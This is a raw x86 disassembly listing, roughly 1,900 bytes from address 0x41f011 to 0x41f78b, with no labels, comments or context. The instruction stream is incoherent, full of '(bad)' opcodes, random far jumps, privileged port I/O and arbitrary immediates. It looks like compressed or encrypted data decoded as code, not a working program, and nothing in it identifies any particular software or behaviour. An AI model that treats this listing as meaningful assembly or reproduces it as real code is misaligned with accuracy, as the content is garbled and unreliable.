  41f011:	sbb    DWORD PTR [ebx+ebx*1+0x4],edi
  41f015:	jge    0x41f017
  41f017:	neg    BYTE PTR [ebx-0x7b]
  41f01a:	test   BYTE PTR [edx-0x364e8ef7],ah
  41f020:	sbb    BYTE PTR [ecx+ebp*8+0x72],bh
  41f024:	je     0x41efe8
  41f026:	dec    DWORD PTR [edi]
  41f028:	push   ecx
  41f029:	dec    ecx
  41f02a:	pop    esi
  41f02b:	pop    esi
  41f02d:	pop    ss
  41f02e:	cmp    eax,DWORD PTR [eax-0x42]
  41f031:	sti    
  41f032:	jp     0x41f066
  41f034:	outs   dx,BYTE PTR ds:[esi]
  41f035:	sbb    DWORD PTR [edx+0x1b0f57ae],0x69
  41f03c:	or     ch,BYTE PTR [esi]
  41f03e:	adc    ebp,DWORD PTR [esi-0x3ad38b6b]
  41f044:	inc    esi
  41f045:	neg    dl
  41f047:	cs inc esp
  41f049:	add    al,0xbc
  41f04b:	lock es data16 ins BYTE PTR es:[edi],dx
  41f04f:	in     eax,dx
  41f050:	js     0x41f0ae
  41f052:	inc    edi
  41f053:	loop   0x41f0ce
  41f055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f056:	xor    al,0x93
  41f058:	mov    edi,0xbde5792b
  41f05d:	sbb    al,0x66
  41f05f:	retf   
  41f060:	out    dx,eax
  41f061:	in     eax,0x25
  41f063:	jge    0x41eff5
  41f065:	test   BYTE PTR [ebx],0x14
  41f068:	adc    al,0x33
  41f06a:	mov    edx,0x483c6b2a
  41f06f:	ja     0x41f04d
  41f071:	xchg   ebp,eax
  41f072:	rcl    DWORD PTR [ebp+0x3ebeafff],cl
  41f078:	loope  0x41f06c
  41f07a:	mov    dl,0x6c
  41f07c:	pop    ebp
  41f07d:	jp     0x41f056
  41f07f:	push   esp
  41f080:	cmp    al,0xd5
  41f082:	(bad)  [esi-0x64]
  41f085:	fcomp  DWORD PTR [edx]
  41f087:	mov    cl,0x22
  41f089:	fsubr  QWORD PTR [ebx+0x0]
  41f08c:	push   edx
  41f08d:	div    DWORD PTR [esi]
  41f08f:	popf   
  41f090:	push   esi
  41f091:	or     BYTE PTR [ecx-0x7f964714],ch
  41f097:	or     al,0x6f
  41f099:	lods   eax,DWORD PTR ds:[esi]
  41f09a:	in     eax,0x34
  41f09c:	dec    edx
  41f09d:	lahf   
  41f09e:	adc    DWORD PTR [eax-0x5b2483a9],esp
  41f0a4:	adc    BYTE PTR [eax],ch
  41f0a6:	ds std 
  41f0a8:	add    edi,edi
  41f0aa:	pop    ebx
  41f0ab:	mov    gs,WORD PTR [ebx-0x21]
  41f0ae:	data16 sub BYTE PTR [ebx-0x11],0xfc
  41f0b3:	scas   al,BYTE PTR es:[edi]
  41f0b4:	push   edx
  41f0b5:	sub    al,0x3f
  41f0b7:	fdiv   DWORD PTR [edi-0x4ec35f51]
  41f0bd:	shl    ebx,cl
  41f0bf:	dec    eax
  41f0c0:	mov    dl,0xc8
  41f0c2:	add    ah,bh
  41f0c4:	popa   
  41f0c5:	xor    BYTE PTR [eax+edi*8],dh
  41f0c8:	ins    BYTE PTR es:[edi],dx
  41f0c9:	push   ebx
  41f0ca:	frstor [ebp+0x4f1d7ef1]
  41f0d0:	fdivr  DWORD PTR [ecx+0x1b]
  41f0d3:	mov    BYTE PTR ds:0xc33cd90b,bl
  41f0d9:	rol    ch,1
  41f0db:	sub    esp,0x537c240e
  41f0e1:	les    edi,FWORD PTR [edi+0x463e0d63]
  41f0e7:	ds ins DWORD PTR es:[edi],dx
  41f0e9:	fs fs mov ch,0x6e
  41f0ed:	xlat   BYTE PTR ds:[ebx]
  41f0ee:	mov    al,0x88
  41f0f0:	std    
  41f0f1:	ds js  0x41f158
  41f0f4:	scas   ax,WORD PTR es:[edi]
  41f0f6:	fbld   TBYTE PTR [esi+0x16]
  41f0f9:	mov    bl,dl
  41f0fb:	test   DWORD PTR [ebp+0x4],esi
  41f0fe:	inc    ecx
  41f0ff:	retf   0x69ef
  41f102:	stos   BYTE PTR es:[edi],al
  41f103:	push   es
  41f104:	(bad)  
  41f105:	jbe    0x41f0b0
  41f107:	repz dec edi
  41f109:	mov    ds:0xeb3ad568,eax
  41f10e:	das    
  41f10f:	popf   
  41f110:	jmp    0x57cf:0xaa796611
  41f117:	loope  0x41f123
  41f119:	icebp  
  41f11a:	hlt    
  41f11b:	inc    esi
  41f11c:	add    DWORD PTR [edx+ecx*2],esp
  41f11f:	out    0xfd,al
  41f121:	pop    ebp
  41f122:	mov    cs,WORD PTR [esi]
  41f124:	aam    0xd8
  41f126:	ja     0x41f132
  41f128:	cwde   
  41f129:	rol    dl,cl
  41f12b:	cmp    bh,BYTE PTR [esi-0xb]
  41f12e:	push   0x95180dfe
  41f133:	dec    ecx
  41f134:	(bad)  
  41f135:	mov    ebx,DWORD PTR [edi-0x16]
  41f138:	sub    eax,0xaf07062f
  41f13d:	push   eax
  41f13e:	push   esi
  41f13f:	fsincos 
  41f141:	imul   edx,DWORD PTR [eax+0x79],0xffffff91
  41f145:	shl    DWORD PTR [esi+0x4b],1
  41f148:	daa    
  41f149:	lock and bl,BYTE PTR [ebx+0x763c67b1]
  41f150:	(bad)  
  41f151:	les    eax,FWORD PTR [eax+0xb]
  41f154:	fcomp  QWORD PTR [ebx]
  41f156:	cmp    ecx,DWORD PTR [esi]
  41f158:	sbb    esp,DWORD PTR [edx+eiz*4]
  41f15b:	push   ebp
  41f15c:	and    dl,BYTE PTR [edx]
  41f15e:	sbb    cl,BYTE PTR ds:0x55d5633c
  41f164:	(bad)  
  41f166:	xor    eax,0xbd7548a4
  41f16b:	fs jo  0x41f0fb
  41f16e:	mov    eax,0xb48f1209
  41f173:	out    dx,al
  41f174:	ror    BYTE PTR [ecx-0x45],1
  41f177:	mov    ah,0xf5
  41f179:	jnp    0x41f163
  41f17b:	gs mov ecx,0xf13012cf
  41f181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f182:	and    al,0x37
  41f184:	xor    edx,DWORD PTR [ebx]
  41f186:	add    al,BYTE PTR [ecx]
  41f188:	mov    bh,bh
  41f18a:	scas   al,BYTE PTR es:[edi]
  41f18b:	jecxz  0x41f171
  41f18d:	cmp    BYTE PTR [edi-0x77e989c1],bh
  41f193:	lods   al,BYTE PTR ds:[esi]
  41f194:	jo     0x41f182
  41f196:	sti    
  41f197:	xor    eax,0xbc0a46c6
  41f19c:	xor    eax,0x558d51a
  41f1a1:	xchg   edi,eax
  41f1a2:	das    
  41f1a3:	sbb    dl,BYTE PTR [esi]
  41f1a5:	sbb    al,0x8a
  41f1a7:	or     al,0xf8
  41f1a9:	gs pushf 
  41f1ab:	mov    DWORD PTR [edi-0x57],esp
  41f1ae:	ds aaa 
  41f1b0:	adc    eax,0xc566674d
  41f1b5:	arpl   bp,si
  41f1b7:	jbe    0x41f215
  41f1b9:	jg     0x41f143
  41f1bb:	and    ch,BYTE PTR [ecx]
  41f1bd:	cmp    edx,DWORD PTR [edx+0x36]
  41f1c0:	cmp    al,0xf6
  41f1c2:	jo     0x41f223
  41f1c4:	sbb    bl,BYTE PTR [ebx+0x0]
  41f1c7:	addr16 mov eax,ds:0x16b6
  41f1cb:	fsub   QWORD PTR [eax]
  41f1cd:	in     al,0xd0
  41f1cf:	std    
  41f1d0:	ss mov dh,0x6a
  41f1d3:	push   edi
  41f1d4:	stc    
  41f1d5:	or     dl,BYTE PTR [eax]
  41f1d7:	cli    
  41f1d8:	cmp    eax,0x5958244a
  41f1dd:	(bad)  
  41f1de:	leave  
  41f1df:	mov    ah,0xdf
  41f1e1:	push   ebp
  41f1e2:	popf   
  41f1e3:	pop    ebx
  41f1e4:	xor    BYTE PTR [edx],dh
  41f1e6:	dec    edx
  41f1e7:	fs cdq 
  41f1e9:	shr    DWORD PTR [eax-0x3a48b1d],1
  41f1ef:	jmp    0xefe2:0x91ae4ed2
  41f1f6:	sub    ah,bl
  41f1f8:	retf   
  41f1f9:	jae    0x41f1c8
  41f1fb:	(bad)  
  41f1fd:	or     al,bh
  41f1ff:	std    
  41f200:	jns    0x41f1ed
  41f202:	jae    0x41f207
  41f204:	adc    dl,dl
  41f206:	enter  0xd783,0x90
  41f20a:	cwde   
  41f20b:	and    edx,DWORD PTR [eax+edx*2]
  41f20e:	add    BYTE PTR [edi],0x49
  41f211:	adc    al,0xbf
  41f213:	and    BYTE PTR ds:[ebp+ebp*2+0x178c9c8c],dl
  41f21b:	icebp  
  41f21c:	inc    ebp
  41f21d:	jle    0x41f213
  41f21f:	xchg   edx,eax
  41f220:	add    bl,bh
  41f222:	cmp    bh,BYTE PTR [edx]
  41f224:	mov    eax,0xc800722e
  41f229:	and    BYTE PTR [ecx+0x7e6744c6],ch
  41f22f:	scas   al,BYTE PTR es:[edi]
  41f230:	dec    esp
  41f231:	push   ebx
  41f232:	jbe    0x41f20c
  41f234:	jns    0x41f291
  41f236:	mov    cl,0x69
  41f238:	(bad)  [ebx+0x376cee19]
  41f23e:	jnp    0x41f22a
  41f240:	mov    ebp,0xe28d068f
  41f245:	ficomp WORD PTR [esi-0x68ebf651]
  41f24b:	in     eax,0xdc
  41f24d:	out    0x2b,eax
  41f24f:	(bad)  
  41f250:	sbb    ebp,DWORD PTR [esi-0x7a]
  41f253:	lahf   
  41f254:	outs   dx,DWORD PTR ds:[esi]
  41f255:	adc    edx,DWORD PTR [edi]
  41f257:	(bad)  
  41f258:	mov    esp,0x70e094e7
  41f25d:	mov    BYTE PTR [edx+0x1988bf24],dh
  41f263:	or     al,al
  41f265:	add    BYTE PTR [ebp-0x5d60be78],0x90
  41f26c:	cwde   
  41f26d:	fs jg  0x41f28f
  41f270:	fistp  WORD PTR [ecx+0x5e368837]
  41f276:	es aas 
  41f278:	mov    ebp,0x96647176
  41f27d:	lods   eax,DWORD PTR ds:[esi]
  41f27e:	cmc    
  41f27f:	xlat   BYTE PTR ds:[ebx]
  41f280:	xchg   edi,eax
  41f281:	push   esp
  41f282:	sbb    al,0xd4
  41f284:	loope  0x41f2d1
  41f286:	or     ecx,ecx
  41f288:	xor    al,BYTE PTR [edx]
  41f28a:	lods   al,BYTE PTR ds:[esi]
  41f28b:	cmp    esp,DWORD PTR [ecx-0x4d27b604]
  41f291:	stc    
  41f292:	inc    DWORD PTR [edi-0x1e3cc1a4]
  41f298:	ret    0x5dcd
  41f29b:	aam    0x96
  41f29d:	xor    DWORD PTR [edx+esi*2-0x5e597261],esp
  41f2a4:	out    dx,eax
  41f2a5:	fidivr WORD PTR [ebp+0xf]
  41f2a8:	mov    ch,0xb1
  41f2aa:	and    edi,DWORD PTR [ecx-0x7]
  41f2ad:	out    dx,eax
  41f2ae:	mov    ds:0x7fbeb12f,eax
  41f2b3:	pusha  
  41f2b4:	stc    
  41f2b5:	aaa    
  41f2b6:	lahf   
  41f2b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2b8:	mov    BYTE PTR [eax-0x4],dl
  41f2bb:	jne    0x41f304
  41f2bd:	jae    0x41f25e
  41f2bf:	mov    ebp,0x5f5e2451
  41f2c4:	lahf   
  41f2c5:	jnp    0x41f309
  41f2c7:	pusha  
  41f2c8:	sahf   
  41f2c9:	pop    es
  41f2ca:	popa   
  41f2cb:	mov    bl,0xfa
  41f2cd:	mov    ebp,0x9a474a8
  41f2d2:	(bad)  
  41f2d3:	cld    
  41f2d4:	and    al,0x60
  41f2d6:	retf   0x4e77
  41f2d9:	sub    al,0x24
  41f2db:	cwde   
  41f2dc:	push   ecx
  41f2dd:	popf   
  41f2de:	pop    es
  41f2df:	cmp    edi,ebx
  41f2e1:	dec    edx
  41f2e2:	jb     0x41f324
  41f2e4:	pushf  
  41f2e5:	mov    ds:0xcf4eda23,eax
  41f2ea:	xor    cl,BYTE PTR [esi+edi*8-0x7e]
  41f2ee:	xor    al,0xee
  41f2f0:	xlat   BYTE PTR ds:[ebx]
  41f2f1:	mov    eax,0xea2041d5
  41f2f6:	pop    edx
  41f2f7:	ins    DWORD PTR es:[edi],dx
  41f2f8:	xchg   esp,eax
  41f2f9:	pusha  
  41f2fa:	cmp    DWORD PTR [eax],ebx
  41f2fc:	cdq    
  41f2fd:	or     esp,edx
  41f2ff:	jl     0x41f2fa
  41f301:	mov    ah,0xc7
  41f303:	push   es
  41f304:	out    0x2a,al
  41f306:	shl    BYTE PTR [eax],cl
  41f308:	inc    esi
  41f309:	mul    edx
  41f30b:	popa   
  41f30c:	cmp    DWORD PTR ds:0xbc996260,ebp
  41f312:	mov    bh,0x65
  41f314:	outs   dx,BYTE PTR ds:[esi]
  41f315:	mov    ds:0x81414566,al
  41f31a:	jg     0x41f38c
  41f31c:	xor    al,0x71
  41f31e:	dec    esi
  41f31f:	or     DWORD PTR [edi],ebp
  41f321:	cld    
  41f322:	fs repz jns 0x41f316
  41f326:	fidiv  WORD PTR [ebx+0x505ca166]
  41f32c:	or     BYTE PTR [ebx+0x2e],ch
  41f32f:	cmp    edx,DWORD PTR [edi+0x212b59b3]
  41f335:	and    ebx,DWORD PTR [esi+0x7982c1f1]
  41f33b:	or     DWORD PTR [ebx+edi*1],ebx
  41f33e:	rcl    BYTE PTR [edi+eiz*1],cl
  41f341:	retf   
  41f342:	call   0x4124cbce
  41f347:	stos   BYTE PTR es:[edi],al
  41f348:	xchg   esp,eax
  41f349:	fistp  DWORD PTR [edi-0x153aad90]
  41f34f:	mov    eax,0xa0791643
  41f354:	or     DWORD PTR es:[esi-0x54f03229],ebp
  41f35b:	push   ss
  41f35c:	jnp    0x630529b0
  41f362:	adc    DWORD PTR [ebx+0x22],esi
  41f365:	dec    ecx
  41f366:	ret    
  41f367:	pop    edi
  41f368:	iret   
  41f369:	sar    DWORD PTR [ebx],1
  41f36b:	xchg   esi,eax
  41f36c:	sbb    ebx,esi
  41f36e:	sub    DWORD PTR [ebx],ecx
  41f370:	sub    ecx,DWORD PTR [ebx-0xf]
  41f373:	mov    fs:0x91bef3e7,al
  41f379:	pushf  
  41f37a:	and    al,0x3
  41f37c:	pop    edx
  41f37d:	cmp    cl,BYTE PTR [edi]
  41f37f:	icebp  
  41f380:	mov    eax,0x348554f7
  41f385:	mov    ds,ebx
  41f387:	fmul   QWORD PTR [ebp+0xe]
  41f38a:	ins    DWORD PTR es:[edi],dx
  41f38b:	mov    ah,ch
  41f38d:	add    dh,bh
  41f38f:	es adc al,0xb3
  41f392:	add    BYTE PTR [eax],ah
  41f394:	pop    edx
  41f395:	sub    eax,0x8969ba26
  41f39a:	push   esp
  41f39b:	cwde   
  41f39c:	pop    ebx
  41f39d:	in     al,dx
  41f39e:	adc    al,0x52
  41f3a0:	sbb    bl,al
  41f3a2:	cld    
  41f3a3:	xor    al,0x82
  41f3a5:	sti    
  41f3a6:	cli    
  41f3a7:	sub    eax,0xa0ada078
  41f3ac:	stos   DWORD PTR es:[edi],eax
  41f3ad:	imul   esp,DWORD PTR [ebp+0x70c3bb1a],0x1d
  41f3b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3b5:	xchg   ebp,eax
  41f3b6:	lock add al,0xb5
  41f3b9:	js     0x41f3c4
  41f3bb:	js     0x41f40e
  41f3bd:	push   edi
  41f3be:	mov    dh,0x2f
  41f3c0:	psrad  mm1,QWORD PTR [esi+0x3d7234b8]
  41f3c7:	es add al,0xb1
  41f3ca:	cmp    DWORD PTR [edx-0x7d065af5],esi
  41f3d0:	and    BYTE PTR [ebx],dh
  41f3d2:	das    
  41f3d3:	pop    esi
  41f3d4:	addr16 stc 
  41f3d6:	call   0x940f:0x972ac164
  41f3dd:	add    BYTE PTR [eax-0x43],ch
  41f3e0:	imul   edi,DWORD PTR [ecx-0x2b],0xfffffff0
  41f3e4:	stos   BYTE PTR es:[edi],al
  41f3e5:	imul   ecx,DWORD PTR [edx+0x2f],0xffffffb2
  41f3e9:	mov    eax,0xefad1648
  41f3ee:	ins    BYTE PTR es:[edi],dx
  41f3ef:	jmp    0xf7c9:0xee3c9888
  41f3f6:	add    dh,BYTE PTR [eax+0x32018000]
  41f3fc:	popa   
  41f3fd:	mov    ch,0x76
  41f3ff:	dec    ebx
  41f400:	out    dx,al
  41f401:	lock push ecx
  41f403:	lahf   
  41f404:	repnz test eax,0xf54f6f88
  41f40a:	iret   
  41f40b:	adc    DWORD PTR ds:0x4374d759,ebp
  41f411:	imul   eax,DWORD PTR [edx-0x5b1047d2],0xffffff8d
  41f418:	lods   eax,DWORD PTR ds:[esi]
  41f419:	test   al,0xe6
  41f41b:	pop    ebp
  41f41c:	into   
  41f41d:	sub    DWORD PTR [ebx+ebx*8+0x46],esi
  41f421:	cmp    dh,BYTE PTR [eax]
  41f423:	sub    DWORD PTR [edi-0x7cd2895a],0x4d73afdc
  41f42d:	cmp    BYTE PTR [esi+0x53],dh
  41f430:	loop   0x41f425
  41f432:	and    edx,DWORD PTR [ecx]
  41f434:	or     BYTE PTR [ebx],bl
  41f436:	add    BYTE PTR [ebx+ecx*2-0x70f61d45],0x9c
  41f43e:	ficomp DWORD PTR [ecx]
  41f440:	pop    ebp
  41f441:	sub    dh,BYTE PTR [ecx]
  41f443:	addr16 leave 
  41f445:	cmp    eax,0x6907f554
  41f44a:	xor    dl,dh
  41f44c:	mov    ah,0xf5
  41f44e:	iret   
  41f44f:	push   0xf9408a16
  41f454:	inc    esp
  41f455:	dec    edi
  41f456:	pop    edx
  41f457:	sbb    DWORD PTR [eax],ebp
  41f459:	stos   BYTE PTR es:[edi],al
  41f45a:	mov    bh,0xc4
  41f45c:	pop    es
  41f45d:	sbb    edx,DWORD PTR [eax+edi*1+0xffe84b0]
  41f464:	loop   0x41f4cc
  41f466:	mov    BYTE PTR [esi+0x68],dl
  41f469:	push   ss
  41f46a:	mov    bh,0x2b
  41f46c:	inc    ebp
  41f46d:	pop    ss
  41f46e:	add    ecx,0x284cb229
  41f474:	jmp    0x41f45f
  41f476:	mov    eax,esi
  41f478:	sub    esi,DWORD PTR [ecx+0x21]
  41f47b:	call   0x3a96:0x557aaada
  41f482:	cmp    BYTE PTR [edi+0x5b],dl
  41f485:	push   ds
  41f486:	xchg   edi,eax
  41f487:	mov    bh,0xe1
  41f489:	shr    BYTE PTR [ecx-0x69],1
  41f48c:	test   ecx,0x6fb87754
  41f492:	sti    
  41f493:	mov    ebp,0xe7686c5d
  41f498:	inc    esp
  41f499:	xchg   esp,eax
  41f49a:	sub    bh,BYTE PTR [ebx-0x49]
  41f49d:	ja     0x41f50c
  41f49f:	(bad)  
  41f4a0:	push   esp
  41f4a1:	add    DWORD PTR [edx],ecx
  41f4a3:	shl    BYTE PTR [ecx],cl
  41f4a5:	and    al,0xa1
  41f4a7:	adc    eax,0x916424f4
  41f4ac:	popa   
  41f4ad:	xchg   ecx,eax
  41f4ae:	sti    
  41f4af:	or     bl,BYTE PTR [edi-0x18]
  41f4b2:	lds    ecx,FWORD PTR [eax]
  41f4b4:	les    edi,FWORD PTR [edi+0x54]
  41f4b7:	mov    WORD PTR [edi-0x7e],?
  41f4ba:	mov    ds:0x6d656375,al
  41f4bf:	jge    0x41f4c5
  41f4c1:	or     eax,0x1a29249
  41f4c6:	jl     0x41f539
  41f4c8:	dec    ebx
  41f4c9:	fcmovb st,st(3)
  41f4cb:	push   eax
  41f4cc:	mov    edi,0xeaa8f22e
  41f4d1:	add    al,BYTE PTR [edi-0x582e79f0]
  41f4d7:	sbb    esi,ecx
  41f4d9:	xor    esp,ecx
  41f4db:	shr    DWORD PTR [ebp+0x5a531609],1
  41f4e1:	inc    edx
  41f4e2:	sub    eax,DWORD PTR [ebx+0x7a97f52a]
  41f4e8:	(bad)
  41f4eb:	or     ebp,edi
  41f4ed:	js     0x41f4ac
  41f4ef:	popa   
  41f4f0:	fdiv   DWORD PTR [eax]
  41f4f2:	test   ch,dh
  41f4f4:	mov    eax,ds:0x16384b28
  41f4f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4fa:	hlt    
  41f4fb:	mov    WORD PTR [edx+ebx*1+0x6b8f82ec],ds
  41f502:	push   cs
  41f503:	dec    ecx
  41f504:	inc    ebx
  41f505:	sbb    DWORD PTR [edx+0x4fcb7da4],eax
  41f50b:	cmp    edi,DWORD PTR [ebp+eax*4-0x99478be]
  41f512:	int3   
  41f513:	mov    ds:0x13b918ad,eax
  41f518:	ja     0x41f4aa
  41f51a:	sbb    esi,ebp
  41f51c:	add    ebx,DWORD PTR [ecx+0x6745863c]
  41f522:	nop
  41f523:	imul   ebp,DWORD PTR [ebp-0x13],0xbdb56b90
  41f52a:	leave  
  41f52b:	sbb    al,0x60
  41f52d:	or     DWORD PTR [ebx-0x694fc67f],esi
  41f533:	aaa    
  41f534:	lock pop ds
  41f536:	mov    esp,0x68db517e
  41f53b:	xlat   BYTE PTR es:[ebx]
  41f53d:	jmp    0x41f50f
  41f53f:	ins    BYTE PTR es:[edi],dx
  41f540:	sub    BYTE PTR [edx-0x78],ah
  41f543:	daa    
  41f544:	fsubr  DWORD PTR [eax]
  41f546:	les    esp,FWORD PTR [eax-0x1c]
  41f549:	js     0x41f52d
  41f54b:	aas    
  41f54c:	mov    ecx,0x2697c772
  41f551:	(bad)  
  41f552:	and    eax,0xaa07b97e
  41f557:	loopne 0x41f525
  41f559:	cmp    ah,BYTE PTR [ecx-0x389a5ee4]
  41f55f:	inc    edx
  41f560:	sub    BYTE PTR [ebx-0x40b2ed5a],bl
  41f566:	xchg   edx,eax
  41f567:	dec    edi
  41f568:	out    dx,eax
  41f569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f56a:	fadd   QWORD PTR [esi+0x73e7bad4]
  41f570:	test   eax,0x4d7ede30
  41f575:	pop    eax
  41f576:	add    al,0x3c
  41f578:	icebp  
  41f579:	pop    eax
  41f57a:	xor    ebx,DWORD PTR [esi-0x47]
  41f57d:	or     ebp,DWORD PTR ds:[eax]
  41f580:	in     eax,0xb3
  41f582:	test   eax,0x2d22ec8b
  41f587:	leave  
  41f588:	psllw  mm0,mm5
  41f58b:	xchg   esp,eax
  41f58c:	or     esp,DWORD PTR [esi]
  41f58e:	aam    0xa1
  41f590:	or     al,0xe5
  41f592:	js     0x41f581
  41f594:	push   ebp
  41f595:	js     0x41f5ac
  41f597:	popa   
  41f598:	addr16 popa 
  41f59a:	lock jne 0x41f5ef
  41f59d:	dec    ebp
  41f59e:	inc    ecx
  41f59f:	cmp    dl,BYTE PTR [edi+0x6815fff3]
  41f5a5:	pop    ebx
  41f5a6:	mov    dl,0x26
  41f5a8:	push   edx
  41f5a9:	outs   dx,DWORD PTR ds:[esi]
  41f5aa:	adc    eax,0xcc8f774d
  41f5af:	pop    ss
  41f5b0:	pop    eax
  41f5b1:	xchg   edi,eax
  41f5b2:	imul   esi,DWORD PTR [edx+0x5467a5f],0x2ed94b9f
  41f5bc:	mov    edi,0x5d37a6ba
  41f5c1:	ds retf 0x510e
  41f5c5:	mov    al,cl
  41f5c7:	pop    esp
  41f5c8:	cli    
  41f5c9:	cwde   
  41f5ca:	ss sbb al,0x65
  41f5cd:	setg   BYTE PTR [ebp+0x4145a04b]
  41f5d4:	pop    esp
  41f5d5:	cmp    al,0xd3
  41f5d7:	and    dl,BYTE PTR [eax-0x60b8a8cd]
  41f5dd:	xchg   ecx,eax
  41f5de:	adc    BYTE PTR [esi-0x7b],bl
  41f5e1:	mov    dl,0xbf
  41f5e3:	(bad)  
  41f5e4:	or     eax,0x892adefc
  41f5e9:	(bad)  
  41f5eb:	xchg   ecx,eax
  41f5ec:	arpl   ax,sp
  41f5ee:	popf   
  41f5ef:	loopne 0x41f575
  41f5f1:	add    ch,ch
  41f5f3:	jb     0x41f671
  41f5f5:	adc    DWORD PTR [ebp-0x29],esi
  41f5f8:	sub    eax,DWORD PTR [ecx]
  41f5fa:	stc    
  41f5fb:	repnz lods al,BYTE PTR ds:[esi]
  41f5fd:	sbb    esi,DWORD PTR [ecx+0x62b5b84a]
  41f603:	mov    eax,DWORD PTR [ecx-0x5c]
  41f606:	sti    
  41f607:	bound  ebx,QWORD PTR [ecx+0x2826976c]
  41f60d:	shr    DWORD PTR [ebp-0x14],0x69
  41f611:	das    
  41f612:	mov    bh,0x9c
  41f614:	and    cl,BYTE PTR [eax]
  41f616:	test   edi,ecx
  41f618:	std    
  41f619:	xchg   edx,eax
  41f61a:	icebp  
  41f61b:	sbb    eax,0x2a49c7f8
  41f620:	shl    BYTE PTR [edx-0x80],0x5f
  41f624:	imul   esi,DWORD PTR [edx+0x11],0x2f
  41f628:	jbe    0x41f5c0
  41f62a:	push   ds
  41f62b:	sub    al,0x5c
  41f62d:	inc    esp
  41f62e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f62f:	mov    esi,0x1e936e62
  41f634:	mov    ebx,0xba6d1c0
  41f639:	mov    ds:0x3e5dfcec,al
  41f63e:	bound  edi,QWORD PTR [eax]
  41f640:	rol    BYTE PTR [eax-0x73049a38],0x3
  41f647:	cmp    dl,al
  41f649:	fisttp QWORD PTR ds:0x1d31cba3
  41f64f:	ins    BYTE PTR es:[edi],dx
  41f650:	xchg   ebp,eax
  41f651:	rcr    BYTE PTR [ebx-0x26],1
  41f654:	das    
  41f655:	push   edx
  41f656:	inc    edi
  41f657:	addr16 call 0xd601:0xf2ef7d94
  41f65f:	adc    al,0x5e
  41f661:	repz (bad) 
  41f663:	sti    
  41f664:	jns    0x41f6e2
  41f666:	jbe    0x41f660
  41f668:	adc    DWORD PTR [ecx],esp
  41f66a:	(bad)  
  41f66b:	add    DWORD PTR [eax],ebp
  41f66d:	(bad)  [ebx-0x7d]
  41f670:	(bad)  
  41f671:	jmp    0x76d0f37a
  41f676:	jae    0x41f6ea
  41f678:	(bad)  
  41f679:	fidiv  DWORD PTR ds:[ebx-0x3e7f2e92]
  41f680:	stc    
  41f681:	jmp    0x53d6:0xc999f579
  41f688:	add    BYTE PTR [ecx],al
  41f68a:	out    0x9e,al
  41f68c:	imul   ecx,edx,0x555aaf79
  41f692:	in     al,0x45
  41f694:	dec    esi
  41f695:	out    dx,al
  41f696:	jb     0x41f67f
  41f698:	inc    ebx
  41f699:	retf   0xa938
  41f69c:	add    BYTE PTR [ecx],dh
  41f69e:	mov    WORD PTR [esi+0x2dc4a63d],?
  41f6a4:	scas   al,BYTE PTR es:[edi]
  41f6a5:	pop    ebx
  41f6a6:	mov    al,bl
  41f6a8:	xchg   ebx,eax
  41f6a9:	stc    
  41f6aa:	lfs    edx,FWORD PTR [edi]
  41f6ad:	test   DWORD PTR [edi-0x880727f],0x9f4d2f38
  41f6b7:	lods   al,BYTE PTR ds:[esi]
  41f6b8:	js     0x41f653
  41f6ba:	out    0x92,al
  41f6bc:	sub    esi,DWORD PTR [ecx-0x49]
  41f6bf:	jg     0x41f708
  41f6c1:	int3   
  41f6c2:	pop    eax
  41f6c3:	cld    
  41f6c4:	dec    edx
  41f6c5:	(bad)  
  41f6c6:	ds int 0xec
  41f6c9:	addr16 cdq 
  41f6cb:	int    0x6d
  41f6cd:	mov    esi,0x3f1aaa7f
  41f6d2:	popf   
  41f6d3:	cmp    DWORD PTR [ebx-0x50beb711],edi
  41f6d9:	in     eax,dx
  41f6da:	cmp    esp,esp
  41f6dc:	ss add ecx,ecx
  41f6df:	lahf   
  41f6e0:	jnp    0x41f725
  41f6e2:	inc    edx
  41f6e3:	mov    al,ds:0xd1b235e0
  41f6e8:	adc    cl,BYTE PTR [edi-0x9662de3]
  41f6ee:	push   es
  41f6ef:	adc    dl,BYTE PTR [edx-0x4e]
  41f6f2:	xchg   BYTE PTR [ecx+eax*1-0x5],dl
  41f6f6:	out    0xfb,eax
  41f6f8:	sar    BYTE PTR [esi-0x17e9ab10],0x31
  41f6ff:	in     al,dx
  41f700:	or     al,0x10
  41f702:	outs   dx,DWORD PTR ds:[esi]
  41f703:	into   
  41f704:	rol    DWORD PTR [edi+0x22],1
  41f707:	aam    0x1f
  41f709:	retf   
  41f70a:	add    ebp,DWORD PTR [esi+ebp*8-0x4f]
  41f70e:	(bad)  [ebx+0x789dffe0]
  41f714:	and    al,0xb8
  41f716:	nop
  41f717:	inc    ecx
  41f718:	adc    dl,al
  41f71a:	push   esp
  41f71b:	push   0xffffff90
  41f71d:	aam    0xc
  41f71f:	stos   DWORD PTR es:[edi],eax
  41f720:	cs test eax,0x4c8599e9
  41f726:	lahf   
  41f727:	fsubrp st(1),st
  41f729:	cmp    al,0x46
  41f72b:	push   0xa390fb01
  41f730:	imul   ebp,DWORD PTR [ebx],0xe2290d52
  41f736:	sub    eax,0xa4b2c29b
  41f73b:	cmp    ebx,DWORD PTR [ebx-0x74]
  41f73e:	add    eax,0x74cf6a17
  41f743:	sub    BYTE PTR [edi-0x4bb2bbb0],ah
  41f749:	jle    0x41f734
  41f74b:	xor    dh,BYTE PTR [ecx+0x70]
  41f74e:	and    edx,DWORD PTR [ebp-0x1f]
  41f751:	mov    esp,0x7fbb2cc
  41f756:	into   
  41f757:	jae    0x41f725
  41f759:	jmp    0x1a11:0xa0196a58
  41f760:	retf   0xf4f9
  41f763:	push   ebx
  41f764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f765:	lahf   
  41f766:	mov    DWORD PTR [ebx-0x73440960],0xd1e2b9f5
  41f770:	mov    bl,0x7d
  41f772:	rol    DWORD PTR [esi],cl
  41f774:	mov    ds:0xabe0d617,al
  41f779:	fnstenv [esi-0x1c7380c9]
  41f77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f780:	lock sub dh,BYTE PTR [si-0x5a67]
  41f786:	xchg   edx,eax
  41f787:	fistp  QWORD PTR [ecx+eiz*1-0x57]
  41f78b:	mov    esp,0xb194f35e
